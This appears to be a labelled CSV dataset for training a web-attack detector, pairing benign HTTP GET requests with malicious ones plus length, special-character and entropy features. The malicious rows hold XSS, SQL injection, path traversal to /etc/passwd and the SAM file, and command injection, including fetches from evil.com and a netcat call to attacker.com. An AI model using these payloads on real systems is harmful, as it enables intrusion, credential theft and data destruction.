payload,label,length,special_ratio,entropy
GET /post?q=javascript:alert('XSS') HTTP/1.1,1,44.0,0.09090909090909091,4.771598379853423
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /run?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,48.0,0.0625,4.615601562950723
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /products.html?sort=name&price=100&id=123 HTTP/1.1,0,54.0,0.037037037037037035,4.773043983484694
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /api/user?user=%27%20OR%20%271%27=%271 HTTP/1.1,1,51.0,0.0,4.2894974005405
GET /settings?id=123&limit=10 HTTP/1.1,0,38.0,0.02631578947368421,4.366091329119193
GET /profile?user=1%27%20AND%20%271%27=%271 HTTP/1.1,1,52.0,0.0,4.404592064578513
GET /docs?id=123 HTTP/1.1,0,25.0,0.0,4.023465189601646
GET /products.html?filter=active HTTP/1.1,0,41.0,0.0,4.607432797248243
GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,55.0,0.0,4.487518632456837
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /settings?limit=10&q=search+term HTTP/1.1,0,45.0,0.022222222222222223,4.563532262755955
GET /register?q=search+term HTTP/1.1,0,36.0,0.0,4.315622570826659
GET /register?color=blue HTTP/1.1,0,33.0,0.0,4.309101316131472
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /index.html?q=search+term&size=medium&price=100 HTTP/1.1,0,60.0,0.03333333333333333,4.731401845392171
GET /exec?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,49.0,0.061224489795918366,4.5172723438944455
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /settings?q=search+term&sort=name&limit=10 HTTP/1.1,0,55.0,0.03636363636363636,4.578833068298883
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
"GET /profile?user=' AND 1=CONVERT(int, (SELECT @@version))-- HTTP/1.1",1,69.0,0.07246376811594203,5.005061188844579
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /profile?filter=active&page=1 HTTP/1.1,0,42.0,0.023809523809523808,4.433634982148037
GET /search?size=medium HTTP/1.1,0,32.0,0.0,4.327819531114783
GET /register?q=search+term HTTP/1.1,0,36.0,0.0,4.315622570826659
GET /blog?price=100&sort=name HTTP/1.1,0,38.0,0.02631578947368421,4.629249223856036
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /contact.html?size=medium&id=123&limit=10 HTTP/1.1,0,54.0,0.037037037037037035,4.623046474778954
GET /api/users?filter=active&page=1&limit=10 HTTP/1.1,0,53.0,0.03773584905660377,4.5319944548414215
GET /post?q=%3Cimg src='x' onerror='alert(1)'%3E HTTP/1.1,1,57.0,0.10526315789473684,4.769220005689465
GET /products.html?color=blue&page=1 HTTP/1.1,0,45.0,0.022222222222222223,4.624751985026255
GET /api/users?limit=10 HTTP/1.1,0,32.0,0.0,4.280639062229566
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /search?q=<input onfocus=alert(1) autofocus> HTTP/1.1,1,57.0,0.07017543859649122,4.700796592884374
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /post?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,53.0,0.11320754716981132,4.824631719074005
GET /dashboard?price=100 HTTP/1.1,0,33.0,0.0,4.392582755590972
GET /dashboard?page=1&id=123 HTTP/1.1,0,37.0,0.02702702702702703,4.445543568156238
GET /blog?size=medium HTTP/1.1,0,30.0,0.0,4.348394345536403
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /dashboard?size=medium&limit=10 HTTP/1.1,0,44.0,0.022727272727272728,4.572623663895163
GET /api/products?price=100 HTTP/1.1,0,36.0,0.0,4.363826390090815
GET /register?id=123&category=electronics HTTP/1.1,0,50.0,0.02,4.536174630069642
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /about.html?category=electronics HTTP/1.1,0,45.0,0.0,4.580307540581811
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /about.html?price=100&page=1 HTTP/1.1,0,41.0,0.024390243902439025,4.607432797248243
GET /search?q=<script>alert('XSS')</script> HTTP/1.1,1,52.0,0.15384615384615385,4.704777458317682
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /login?limit=10&size=medium&category=electronics HTTP/1.1,0,61.0,0.03278688524590164,4.633056755660073
GET /download?file=..;/..;/..;/etc/passwd HTTP/1.1,1,50.0,0.06,4.335337750470313
GET /products.html?limit=10&q=search+term&size=medium HTTP/1.1,0,62.0,0.03225806451612903,4.70606602030213
GET /dashboard?page=1&size=medium&category=electronics HTTP/1.1,0,63.0,0.031746031746031744,4.7343630580428036
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /dashboard?color=blue HTTP/1.1,0,34.0,0.0,4.337175341123076
GET /settings?id=123&category=electronics HTTP/1.1,0,50.0,0.02,4.568367439558378
GET /blog?page=1&id=123&q=search+term HTTP/1.1,0,46.0,0.043478260869565216,4.778677988524612
GET /post?q=%3Caudio src=x onerror=alert(1)%3E HTTP/1.1,1,55.0,0.03636363636363636,4.729099659325981
GET /search?limit=10 HTTP/1.1,0,29.0,0.0,4.32316116739216
GET /comment?q=<script>alert('XSS')</script> HTTP/1.1,1,53.0,0.1509433962264151,4.803023284588598
GET /command?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,52.0,0.057692307692307696,4.474008227548451
GET /dashboard?limit=10&category=electronics&q=search+term HTTP/1.1,0,67.0,0.029850746268656716,4.726557758191287
GET /docs?id=123&sort=name HTTP/1.1,0,35.0,0.02857142857142857,4.514718016821337
GET /comment?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,54.0,0.07407407407407407,4.6691617524766045
GET /api/user?user=' OR '1'='1'/* HTTP/1.1,1,42.0,0.11904761904761904,4.193161994764468
GET /settings?filter=active&page=1 HTTP/1.1,0,43.0,0.023255813953488372,4.443365626644181
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /profile?user=' UNION SELECT NULL-- HTTP/1.1,1,48.0,0.020833333333333332,4.629247855285173
GET /blog?limit=10&category=electronics HTTP/1.1,0,48.0,0.020833333333333332,4.584147917027247
GET /api/users?size=medium&price=100&id=123 HTTP/1.1,0,52.0,0.038461538461538464,4.496032208850887
GET /settings?category=electronics&filter=active HTTP/1.1,0,57.0,0.017543859649122806,4.441938917407823
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /index.html?color=blue HTTP/1.1,0,35.0,0.0,4.514718016821338
GET /blog?size=medium&price=100 HTTP/1.1,0,40.0,0.025,4.596439344671015
GET /comment?q=%3Caudio src=x onerror=alert(1)%3E HTTP/1.1,1,58.0,0.034482758620689655,4.743684607488078
GET /index.html?size=medium&page=1 HTTP/1.1,0,43.0,0.023255813953488372,4.5653449870589835
GET /login?user=%27%20OR%20%27a%27=%27a HTTP/1.1,1,48.0,0.0,4.422995052579128
GET /file?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,51.0,0.0,4.355537901604238
GET /search?category=electronics&q=search+term&size=medium HTTP/1.1,0,67.0,0.029850746268656716,4.637005519385317
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /api/user?user=%27%20OR%20%27a%27=%27a HTTP/1.1,1,51.0,0.0,4.313911371086314
GET /search?q=search+term&filter=active HTTP/1.1,0,48.0,0.020833333333333332,4.488521032323434
GET /profile?id=123&page=1 HTTP/1.1,0,35.0,0.02857142857142857,4.422000516883151
GET /dashboard?filter=active&id=123&page=1 HTTP/1.1,0,51.0,0.0392156862745098,4.696455979014295
GET /command?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,52.0,0.038461538461538464,4.334679141051594
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /file?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,58.0,0.0,4.27538703061342
GET /command?cmd=hostname`id` HTTP/1.1,1,38.0,0.05263157894736842,4.366091329119192
GET /login?limit=10 HTTP/1.1,0,28.0,0.0,4.0836169753972325
GET /exec?cmd=hostname; sleep 10 HTTP/1.1,1,41.0,0.024390243902439025,4.452200407575065
GET /document?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,55.0,0.0,4.56024590518411
GET /login?user=admin' -- HTTP/1.1,1,34.0,0.029411764705882353,4.51364592935837
"GET /api/user?user=%27%20UNION%20ALL%20SELECT%20NULL,NULL-- HTTP/1.1",1,68.0,0.0,4.688412430812586
GET /contact.html?sort=name&category=electronics&q=search+term HTTP/1.1,0,71.0,0.028169014084507043,4.515168070936917
GET /dashboard?filter=active HTTP/1.1,0,37.0,0.0,4.5199999871336285
GET /search?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,55.0,0.10909090909090909,4.803642667873433
GET /profile?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,60.0,0.1,4.896404087557007
GET /comment?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.782639243749498
GET /document?file=../../../etc/passwd HTTP/1.1,1,47.0,0.0,4.348822160974294
GET /search?filter=active&sort=name HTTP/1.1,0,44.0,0.022727272727272728,4.527169118440618
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /search?user=' UNION SELECT * FROM users-- HTTP/1.1,1,55.0,0.01818181818181818,4.655611586962955
GET /dashboard?sort=name HTTP/1.1,0,33.0,0.0,4.331976694984911
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /search?page=1&size=medium&color=blue HTTP/1.1,0,50.0,0.04,4.64637013015618
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /api/user?user=1' ORDER BY 1-- HTTP/1.1,1,43.0,0.023255813953488372,4.423487650544802
GET /login?user=' OR 'a'='a HTTP/1.1,1,36.0,0.1111111111111111,4.3711781263822145
GET /file?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,52.0,0.1346153846153846,3.9453055682456224
GET /command?cmd=hostname; ls -la HTTP/1.1,1,42.0,0.023809523809523808,4.403989446485262
GET /search?user=1%27%20AND%20%271%27=%272 HTTP/1.1,1,51.0,0.0,4.3015204996010326
GET /blog?filter=active&page=1&price=100 HTTP/1.1,0,49.0,0.04081632653061224,4.548084078676629
GET /api/user?user=%27%20OR%20%271%27=%271%27%20-- HTTP/1.1,1,59.0,0.0,4.25765486324443
GET /profile?q=<select onfocus=alert(1) autofocus> HTTP/1.1,1,59.0,0.06779661016949153,4.634359312213627
GET /file?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,60.0,0.1,4.549791896188175
GET /dashboard?id=123&sort=name HTTP/1.1,0,40.0,0.025,4.546439344671016
GET /profile?user=' OR '1'='1'/* HTTP/1.1,1,41.0,0.12195121951219512,4.305858944160431
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /profile?id=123 HTTP/1.1,0,28.0,0.0,4.253434386188785
GET /search?user=%27%20OR%20%27a%27=%27a HTTP/1.1,1,49.0,0.0,4.297784843850294
GET /login?id=123&sort=name HTTP/1.1,0,36.0,0.027777777777777776,4.572431251322119
"GET /login?user=%27%20AND%201=CONVERT(int,%20(SELECT%20@@version))-- HTTP/1.1",1,77.0,0.05194805194805195,5.083752983165023
GET /post?q=<script>alert('XSS')</script> HTTP/1.1,1,50.0,0.16,4.688367439558378
GET /command?cmd=hostname`wget http://evil.com/malware` HTTP/1.1,1,64.0,0.03125,4.654078664259099
GET /products.html?q=search+term HTTP/1.1,0,41.0,0.0,4.570609016654903
GET /search?q=javascript:alert('XSS') HTTP/1.1,1,46.0,0.08695652173913043,4.751610325528165
GET /docs?price=100&color=blue&id=123 HTTP/1.1,0,46.0,0.043478260869565216,4.544876086303668
GET /file?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,51.0,0.0,4.355537901604238
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /image?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,60.0,0.0,4.420869604629682
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /api/products?limit=10&filter=active&price=100 HTTP/1.1,0,59.0,0.03389830508474576,4.568255337130744
GET /blog?price=100&page=1&q=search+term HTTP/1.1,0,49.0,0.04081632653061224,4.6705330582684645
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /api/users?size=medium HTTP/1.1,0,35.0,0.0,4.221441945207327
GET /api/products?size=medium&limit=10 HTTP/1.1,0,47.0,0.02127659574468085,4.562478415867198
GET /profile?size=medium&limit=10&q=search+term HTTP/1.1,0,56.0,0.03571428571428571,4.695947226387472
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /post?q=<script>alert(document.cookie)</script> HTTP/1.1,1,60.0,0.1,4.7253263791155
GET /file?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,59.0,0.0,4.33753695684099
GET /api/users?filter=active HTTP/1.1,0,37.0,0.0,4.371087149178845
GET /run?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,48.0,0.0625,4.615601562950723
GET /comment?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1,1,61.0,0.06557377049180328,4.819680984926534
GET /api/products?page=1&limit=10&size=medium HTTP/1.1,0,54.0,0.037037037037037035,4.604165919063142
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /file?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,60.0,0.1,4.549791896188175
GET /post?q=<script>alert(document.cookie)</script> HTTP/1.1,1,60.0,0.1,4.7253263791155
GET /api/users?size=medium HTTP/1.1,0,35.0,0.0,4.221441945207327
GET /login?user=') OR ('1'='1 HTTP/1.1,1,38.0,0.15789473684210525,4.385956789702442
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /profile?user=1' AND '1'='1 HTTP/1.1,1,40.0,0.1,4.312814895472355
GET /register?sort=name&size=medium&q=search+term HTTP/1.1,0,58.0,0.034482758620689655,4.542796944481125
GET /profile?q=%3Cimg src='x' onerror='alert(1)'%3E HTTP/1.1,1,60.0,0.1,4.7854870536894465
GET /profile?q=<script>alert(document.cookie)</script> HTTP/1.1,1,63.0,0.09523809523809523,4.766729724984195
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /blog?filter=active&size=medium HTTP/1.1,0,44.0,0.022727272727272728,4.669547811769945
GET /search?q=<video><source onerror='alert(1)'> HTTP/1.1,1,57.0,0.14035087719298245,4.6858009267041405
GET /post?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1,1,58.0,0.06896551724137931,4.710923667317557
GET /api/products?color=blue&filter=active HTTP/1.1,0,51.0,0.0196078431372549,4.598033429825002
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /search?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,60.0,0.06666666666666667,4.604574504151557
GET /profile?id=123 HTTP/1.1,0,28.0,0.0,4.253434386188785
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /profile?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1,1,61.0,0.06557377049180328,4.774518894727133
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /products.html?limit=10 HTTP/1.1,0,36.0,0.0,4.440351042928688
GET /blog?color=blue&q=search+term&sort=name HTTP/1.1,0,53.0,0.03773584905660377,4.628587199723757
GET /search?user=admin' -- HTTP/1.1,1,35.0,0.02857142857142857,4.4575751596784805
GET /comment?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,54.0,0.07407407407407407,4.6691617524766045
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /post?q=%3Cscript%3Edocument.location='http://evil.com'%3C/script%3E HTTP/1.1,1,81.0,0.024691358024691357,4.7904678314479865
GET /exec?cmd=hostname| nc attacker.com 4444 HTTP/1.1,1,53.0,0.018867924528301886,4.44039534215702
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /profile?user=' OR '1'='1'/* HTTP/1.1,1,41.0,0.12195121951219512,4.305858944160431
GET /command?cmd=hostname| whoami HTTP/1.1,1,42.0,0.023809523809523808,4.377336696990887
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /login?id=123&color=blue HTTP/1.1,0,37.0,0.02702702702702703,4.479195257286955
GET /profile?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,54.0,0.07407407407407407,4.6710111130341945
GET /api/user?user=' OR '1'='1' -- HTTP/1.1,1,43.0,0.11627906976744186,4.200007639511387
GET /login?user=' OR '1'='1'/* HTTP/1.1,1,39.0,0.1282051282051282,4.282340283509331
GET /dashboard?price=100&limit=10 HTTP/1.1,0,42.0,0.023809523809523808,4.57649212500518
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /image?file=....//....//....//etc/passwd HTTP/1.1,1,53.0,0.0,3.913867315824671
GET /profile?size=medium&limit=10&color=blue HTTP/1.1,0,53.0,0.03773584905660377,4.569730303898025
GET /contact.html?page=1 HTTP/1.1,0,33.0,0.0,4.309101316131472
GET /login?user=1' ORDER BY 1-- HTTP/1.1,1,40.0,0.025,4.512814895472355
GET /products.html?page=1&q=search+term&color=blue HTTP/1.1,0,59.0,0.03389830508474576,4.708334362664479
GET /dashboard?q=search+term&page=1 HTTP/1.1,0,44.0,0.022727272727272728,4.572623663895164
GET /profile?id=123&sort=name HTTP/1.1,0,38.0,0.02631578947368421,4.629249223856036
GET /api/users?q=search+term&price=100 HTTP/1.1,0,47.0,0.02127659574468085,4.511619702557343
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /index.html?category=electronics&limit=10&page=1 HTTP/1.1,0,61.0,0.03278688524590164,4.707307985381069
GET /settings?size=medium&price=100&color=blue HTTP/1.1,0,55.0,0.03636363636363636,4.679010795650282
GET /register?q=search+term&limit=10&color=blue HTTP/1.1,0,56.0,0.03571428571428571,4.633272672738776
GET /index.html?sort=name&page=1 HTTP/1.1,0,41.0,0.024390243902439025,4.6193895044597815
GET /search?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,59.0,0.1016949152542373,4.848851211061991
GET /profile?page=1&size=medium HTTP/1.1,0,40.0,0.025,4.515311532225102
GET /docs?filter=active&price=100 HTTP/1.1,0,42.0,0.023809523809523808,4.540545101092634
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /comment?q=<script>alert('XSS')</script> HTTP/1.1,1,53.0,0.1509433962264151,4.803023284588598
GET /register?q=search+term&filter=active HTTP/1.1,0,50.0,0.02,4.47127238011291
GET /contact.html?price=100&filter=active&limit=10 HTTP/1.1,0,59.0,0.03389830508474576,4.511560795301144
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /login?user=1' AND '1'='2 HTTP/1.1,1,38.0,0.10526315789473684,4.385956789702442
GET /comment?q=<svg onload=alert('XSS')> HTTP/1.1,1,49.0,0.12244897959183673,4.874614690921527
GET /about.html?q=search+term HTTP/1.1,0,38.0,0.0,4.523986065961298
GET /image?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,60.0,0.0,4.420869604629682
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /image?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,53.0,0.1320754716981132,4.043637892401607
GET /api/products?filter=active&price=100&page=1 HTTP/1.1,0,57.0,0.03508771929824561,4.582289794600804
GET /run?cmd=hostname& cat /etc/passwd HTTP/1.1,1,47.0,0.02127659574468085,4.4955582663410985
GET /profile?user=%27%20OR%20%271%27=%271%27/* HTTP/1.1,1,55.0,0.0,4.355498179205201
GET /post?q=<body onload=alert('XSS')> HTTP/1.1,1,47.0,0.1276595744680851,4.799061723926001
GET /profile?user=%27%20OR%20%271%27=%271%27%20-- HTTP/1.1,1,58.0,0.0,4.32143934894199
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /contact.html?id=123&q=search+term&price=100 HTTP/1.1,0,57.0,0.03508771929824561,4.762371592960285
GET /profile?id=123 HTTP/1.1,0,28.0,0.0,4.253434386188785
GET /register?id=123&q=search+term HTTP/1.1,0,43.0,0.023255813953488372,4.553944405764262
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /download?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,62.0,0.0,4.409189053260732
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /products.html?limit=10&category=electronics HTTP/1.1,0,57.0,0.017543859649122806,4.694401365224721
GET /index.html?id=123&filter=active&q=search+term HTTP/1.1,0,59.0,0.03389830508474576,4.753334736089116
GET /contact.html?size=medium HTTP/1.1,0,38.0,0.0,4.504120605378049
GET /index.html?q=search+term&category=electronics&filter=active HTTP/1.1,0,73.0,0.0273972602739726,4.686418997758725
GET /index.html?q=search+term HTTP/1.1,0,38.0,0.0,4.576617644908666
GET /comment?q=%3Ckeygen onfocus=alert(1) autofocus%3E HTTP/1.1,1,63.0,0.031746031746031744,4.800470947509161
GET /login?user=' OR '1'='1' -- HTTP/1.1,1,40.0,0.125,4.272573883611434
GET /search?user=1' ORDER BY 1-- HTTP/1.1,1,41.0,0.024390243902439025,4.421831810066857
GET /download?file=../../../../../../etc/passwd HTTP/1.1,1,56.0,0.0,3.983340344322928
GET /login?sort=name&color=blue HTTP/1.1,0,40.0,0.025,4.534183719779189
GET /file?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,52.0,0.1346153846153846,3.9453055682456224
GET /profile?user=1%27%20ORDER%20BY%201-- HTTP/1.1,1,50.0,0.0,4.693660689688186
GET /settings?page=1 HTTP/1.1,0,29.0,0.0,4.1162646156680225
GET /comment?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,54.0,0.07407407407407407,4.6691617524766045
GET /api/users?category=electronics&filter=active&sort=name HTTP/1.1,0,68.0,0.029411764705882353,4.559664085192535
GET /docs?sort=name HTTP/1.1,0,28.0,0.0,4.280394654123195
GET /about.html?q=search+term HTTP/1.1,0,38.0,0.0,4.523986065961298
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /download?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,56.0,0.125,4.106158925726099
GET /contact.html?category=electronics HTTP/1.1,0,47.0,0.0,4.416632607946488
GET /about.html?q=search+term&id=123&price=100 HTTP/1.1,0,55.0,0.03636363636363636,4.84000630423707
GET /profile?user=1' AND '1'='2 HTTP/1.1,1,40.0,0.1,4.403055907333275
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /search?q=search+term HTTP/1.1,0,34.0,0.0,4.256149238118268
GET /api/user?user=1%27%20ORDER%20BY%2010-- HTTP/1.1,1,52.0,0.0,4.59448250651942
"GET /profile?user=' AND 1=CONVERT(int, (SELECT @@version))-- HTTP/1.1",1,69.0,0.07246376811594203,5.005061188844579
GET /search?user=' UNION SELECT * FROM users-- HTTP/1.1,1,55.0,0.01818181818181818,4.655611586962955
GET /login?user=1' ORDER BY 10-- HTTP/1.1,1,41.0,0.024390243902439025,4.5681732734814915
GET /profile?user=1' ORDER BY 1-- HTTP/1.1,1,42.0,0.023809523809523808,4.526495328097802
GET /profile?q=%3Cselect onfocus=alert(1) autofocus%3E HTTP/1.1,1,63.0,0.031746031746031744,4.7130142014087335
GET /document?file=..//..//..//etc/passwd HTTP/1.1,1,50.0,0.0,4.250044500340504
GET /search?filter=active&category=electronics HTTP/1.1,0,55.0,0.01818181818181818,4.483467386520037
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /api/products?limit=10&sort=name&id=123 HTTP/1.1,0,52.0,0.038461538461538464,4.6808329872054415
GET /login?user=' OR 'a'='a HTTP/1.1,1,36.0,0.1111111111111111,4.3711781263822145
GET /profile?user=' OR '1'='1' -- HTTP/1.1,1,42.0,0.11904761904761904,4.297694364420734
GET /run?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,48.0,0.041666666666666664,4.4803885422075345
GET /comment?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,76.0,0.07894736842105263,4.719572540832782
GET /dashboard?color=blue&id=123&sort=name HTTP/1.1,0,51.0,0.0392156862745098,4.6816542632855995
GET /login?user=' OR 1=1 -- HTTP/1.1,1,36.0,0.027777777777777776,4.326465890981192
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /dashboard?page=1&price=100 HTTP/1.1,0,40.0,0.025,4.484183719779189
GET /api/users?page=1&category=electronics HTTP/1.1,0,51.0,0.0196078431372549,4.5176439108032405
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /comment?q=%3Cinput onfocus=alert(1) autofocus%3E HTTP/1.1,1,62.0,0.03225806451612903,4.750499689691863
GET /image?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,61.0,0.09836065573770492,4.563099272559269
GET /settings?category=electronics HTTP/1.1,0,43.0,0.0,4.350342370830227
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /index.html?category=electronics&q=search+term HTTP/1.1,0,59.0,0.01694915254237288,4.691716566200984
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /login?user=%27%20UNION%20SELECT%20*%20FROM%20users-- HTTP/1.1,1,66.0,0.0,4.8604703998521295
GET /post?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,58.0,0.06896551724137931,4.59946860789152
GET /settings?size=medium HTTP/1.1,0,34.0,0.0,4.233946664525225
GET /search?q=<img src='x' onerror='alert(1)'> HTTP/1.1,1,55.0,0.14545454545454545,4.68082653147046
GET /search?q=javascript:alert('XSS') HTTP/1.1,1,46.0,0.08695652173913043,4.751610325528165
GET /run?cmd=hostname; ls -la HTTP/1.1,1,38.0,0.02631578947368421,4.543851526544547
GET /products.html?price=100&limit=10 HTTP/1.1,0,46.0,0.021739130434782608,4.544876086303668
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /search?user=' OR '1'='1' -- HTTP/1.1,1,41.0,0.12195121951219512,4.187450335080594
GET /blog?size=medium&id=123 HTTP/1.1,0,37.0,0.02702702702702703,4.499597622210292
GET /api/users?category=electronics HTTP/1.1,0,44.0,0.0,4.464558038845993
GET /api/users?filter=active HTTP/1.1,0,37.0,0.0,4.371087149178845
GET /profile?user='; DROP TABLE users-- HTTP/1.1,1,48.0,0.041666666666666664,4.629247855285172
GET /run?cmd=hostname`id` HTTP/1.1,1,34.0,0.058823529411764705,4.5358485029514135
GET /login?sort=name&q=search+term&id=123 HTTP/1.1,0,50.0,0.04,4.768367439558379
GET /post?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,53.0,0.11320754716981132,4.824631719074005
GET /profile?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,55.0,0.05454545454545454,4.836374832596711
